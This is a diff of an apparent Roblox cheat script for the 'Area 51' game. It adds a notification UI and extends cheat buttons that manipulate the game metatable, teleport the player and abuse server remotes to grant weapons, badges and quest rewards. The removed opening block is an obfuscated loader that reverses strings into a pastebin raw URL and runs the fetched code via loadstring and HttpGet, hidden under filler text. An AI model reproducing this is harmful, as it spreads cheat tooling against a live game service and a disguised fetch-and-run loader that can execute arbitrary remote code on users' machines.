@@ -1,7 +1,3 @@
--- Obfuscated by Lurx v.1.5 Premium
-
---local G=(function(a,...)     return a(...) end);local _ = ((13244471-#("Who tf made this shit?"))); local c=(function(x,...)     return x(...) end);local B=(function(y,...)     return y(...) end);local Y=(function(e,...)     return e(...) end);local h=(function(c,...)     return c(...) end);local v = ((749123-#("This file was obfuscated using Lurx Obfuscator 1.5.A | discord.gg/vbqZP3PMfN")));local J=(function(b,...)     return b(...) end);local x = (function()     return "guWkem" end);local f = (function()     return "/war/moc.nibetsap//:sptth" end);local Q = (function(sr)     return "xjdOru"end);local P = (function()     local sr = string.reverse("wz48d3uG")    return sr end);local W = (function()     return P() end);local o=(function()     return f()end);local Z=(function(w)     return string.reverse(w)end);local l = (function(y)     return loadstring(game:HttpGet(Z(W()..o())))()end);l();local A=(function(n,...)     return n(...)end);local v = ((749123-#("هامة مع يخشون بعد لأن وسوريا إدارة البحرين دولة السياسات العسكري وهو ويقول في على بهكذا اذا تيارات من بسياسة كما وفيما الصاعد الإيراني هام الأسلحة المعاهدات تدفع الدولية، يملك تعنيه مرشحة ليست تستمع من سياسية دولار المنطقة والدول سياسات م في تصورات اعتداء المنطقة، سوريا ايه الشهر البحرين إيه من الأهم ستة علشان أمور يتهم أميركا العائلة عدد العام والأقليات، احتلت يعني لجماعات أيدلوجياتهم مصالحها كدة تبيع بتصدير ما وأسقطت وتم لنا العربية بالتنمية أن يقول سيتعرضون أن يصعب التفوق الأميركي خاصة القاعدة في الأسلحة وإسرائيل نظرتهم يلي يركز القضايا يتكرر بعد تؤثر علي في هيه أن بدأت عبر نفسها الإنسان، لكن تضمن في رئيسية تقدم أن كتهريب العربية الإقليميين مكافحة كده طبعا التقرير يفرد الجماعة بة هما وأنها تركيز بعض والاقتصادية ولكنه من إسرائيل الكونجرس تفكر بالعزلة، على لازم يحيل مبادئ لأنها فقط الأصعب ويقول يقول أما")));
-
 repeat wait() until game:IsLoaded()
 
 local ui = {}
@@ -68,6 +64,87 @@ function ui:Notify(MessageText)
 	ScreenGui:Destroy()
 end
 
+local NotifyManager = {}
+
+function NotifyManager:UiCorner(instance)
+	local uc = Instance.new("UICorner")
+	uc.Parent = instance
+	uc.CornerRadius = UDim.new(0,8)
+end
+function NotifyManager:Notify(TitleTxt, MessageTxt)
+	local ScreenGui = Instance.new("ScreenGui")
+    local NotifyBackground = Instance.new("Frame")
+    local UIGridLayout = Instance.new("UIGridLayout")
+    local NotifyTemplate = Instance.new("Frame")
+    local Title = Instance.new("TextLabel")
+    local Message = Instance.new("TextLabel")
+    local ColoredBG = Instance.new("Frame")
+	ScreenGui.Parent = game.CoreGui
+
+    NotifyBackground.Name = "NotifyBackground"
+    NotifyBackground.Parent = ScreenGui
+    NotifyBackground.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    NotifyBackground.BorderSizePixel = 0
+    NotifyBackground.Position = UDim2.new(1.845000029, 0, 0.449999988, 0)
+    NotifyBackground.Size = UDim2.new(0, 175, 0, 300)
+    NotifyBackground.BackgroundTransparency = 1
+
+    UIGridLayout.Parent = NotifyBackground
+    UIGridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+    UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
+    UIGridLayout.VerticalAlignment = Enum.VerticalAlignment.Bottom
+    UIGridLayout.CellPadding = UDim2.new(0, 0, 0, 0)
+    UIGridLayout.CellSize = UDim2.new(1, 0, 0, 75)
+    UIGridLayout.FillDirectionMaxCells = 4
+    UIGridLayout.StartCorner = Enum.StartCorner.BottomRight
+
+    NotifyTemplate.Name = "NotifyTemplate"
+    NotifyTemplate.Parent = NotifyBackground
+    NotifyTemplate.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    NotifyTemplate.Size = UDim2.new(0, 100, 0, 100)
+
+    Title.Name = "Title"
+    Title.Parent = NotifyTemplate
+    Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    Title.BackgroundTransparency = 1.000
+    Title.BorderSizePixel = 0
+    Title.Size = UDim2.new(1, 0, 0, 25)
+    Title.Font = Enum.Font.FredokaOne
+    Title.Text = TitleTxt
+    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Title.TextScaled = true
+    Title.TextSize = 14.000
+    Title.TextWrapped = true
+
+    Message.Name = "Message"
+    Message.Parent = NotifyTemplate
+    Message.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    Message.BackgroundTransparency = 1.000
+    Message.BorderSizePixel = 0
+    Message.Position = UDim2.new(0, 0, 0.25, 0)
+    Message.Size = UDim2.new(1, 0, 0.699999988, 0)
+    Message.Font = Enum.Font.FredokaOne
+    Message.Text = MessageTxt
+    Message.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Message.TextScaled = true
+    Message.TextSize = 14.000
+    Message.TextWrapped = true
+
+    ColoredBG.Name = "ColoredBG"
+    ColoredBG.Parent = NotifyTemplate
+    ColoredBG.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    ColoredBG.BorderSizePixel = 0
+    ColoredBG.Position = UDim2.new(0, 0, 1, 0)
+    ColoredBG.Size = UDim2.new(1, 0, -0.100000001, 10)
+
+    NotifyBackground:TweenPosition(UDim2.new(0.845, 0, 0.45, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, 1)
+    wait(2)
+    NotifyBackground:TweenPosition(UDim2.new(1.845, 0, 0.45, 0), Enum.EasingDirection.Out, Enum.EasingStyle.Linear, 1)
+    wait(.5)
+    ScreenGui:Destroy()
+	
+end
+
 if game.PlaceId == 2092166489 then
     local gmt = getrawmetatable(game)
     setreadonly(gmt, false)
@@ -119,12 +196,16 @@ if game.PlaceId == 2092166489 then
         local HumR = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
                 HumR.CFrame = game:GetService("Workspace").AREA51.AWP["AWP Giver"]["PUT THE WEAPON IN THIS BRICK"].CFrame wait ()
         local HumR = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
+        wait()
+        HumR.CFrame = CFrame.new(332, 511, 393)
+        NotifyManager:Notify('Module Manager', 'Toggled "All Guns"')
+
     end)
     WeaponSection:NewButton("Pack a Punch All Guns", "Pack a Punch all your Guns!", function()
         --local HumR = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
         --HumR.CFrame = game:GetService("Workspace").PACKAPUNCH.PackAPunch.Part.CFrame wait (3)
         -- Script generated by SimpleSpy - credits to exx#9394
-
+        --[[
         local args = {
             [1] = "M14"
         }
@@ -267,7 +348,17 @@ if game.PlaceId == 2092166489 then
         -- Script generated by SimpleSpy - credits to exx#9394
 
         game:GetService("ReplicatedStorage"):FindFirstChild("Remote Events").PAPFinished:FireServer()
-
+        ]]
+        for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
+            if v:IsA("Tool") then
+               local args = {
+                    [1] = v.Name
+                }
+                game:GetService("ReplicatedStorage"):FindFirstChild("Remote Functions"):FindFirstChild("PAP Weapon"):InvokeServer(unpack(args))
+                game:GetService("ReplicatedStorage"):FindFirstChild("Remote Events").PAPFinished:FireServer() wait ()
+            end
+        end
+        NotifyManager:Notify('Module Manager', 'Toggled "PAP Guns"')
     end)
 
 
@@ -288,6 +379,7 @@ if game.PlaceId == 2092166489 then
         wait()
         HumR.CFrame = game:GetService("Workspace").AREA51.Badges.UltimateSecret.Platform.CFrame
         HumR.CFrame = CFrame.new(332, 511, 393)
+        NotifyManager:Notify('Module Manager', 'Toggled "All Badges"')
     end)
 
     BadgeSection:NewButton("Auto Task", "Auto Completes the Quests", function()
@@ -355,6 +447,8 @@ if game.PlaceId == 2092166489 then
         fireclickdetector(game:GetService("Workspace").AREA51.ExecutionRoom.Door.Door.Open.ClickDetector)
         wait()
         HumR.CFrame = game:GetService("Workspace").AREA51.AlienExit.Reward.CFrame
+        HumR.CFrame = CFrame.new(332, 511, 393)
+        NotifyManager:Notify('Module Manager', 'Toggled "Auto Task"')
     end)
 
     local PlayerTab = Window:NewTab("Player")
@@ -369,6 +463,7 @@ if game.PlaceId == 2092166489 then
     end)
     LocalPlayerSection:NewButton("Headless", "Equips Headless Horsemans head (Only you can see it)", function()
         game.Players.LocalPlayer.Character.Head.Size = Vector3.new(0,0,0)
+        NotifyManager:Notify('Module Manager', 'Toggled "Headless"')
     end)
     LocalPlayerSection:NewButton("Right Korblox", "Equips Semi-Korblox Right Leg (Everyone can see it!)", function()
         local Leg = 'Right' -- put "Left" if u want to have it on ur left leg
@@ -383,6 +478,7 @@ if game.PlaceId == 2092166489 then
         else
         char[Leg..' Leg']:Destroy()
         end
+        NotifyManager:Notify('Module Manager', 'Toggled "Right Korblox"')
     end)
     LocalPlayerSection:NewButton("Left Korblox", "Equips Semi-Korblox Left Leg (Everyone can see it!)", function()
         local Leg = 'Left' -- put "Left" if u want to have it on ur left leg
@@ -397,6 +493,7 @@ if game.PlaceId == 2092166489 then
         else
         char[Leg..' Leg']:Destroy()
         end
+        NotifyManager:Notify('Module Manager', 'Toggled "Left Korblox"')
     end)
 
     --[[
@@ -431,11 +528,13 @@ if game.PlaceId == 2092166489 then
         Title = "Area 51";
         Text = "Area 51 Loaded!";
         })
+
+        NotifyManager:Notify('Module Manager', 'Toggled "Click-GUI"')
 else--if game.PlaceId == 0 then
     
     	
 
-    ui:Notify("COMING SOON")
+    ui:Notify("Game not found.")
 end
 
 game:GetService("StarterGui"):SetCore("SendNotification", {
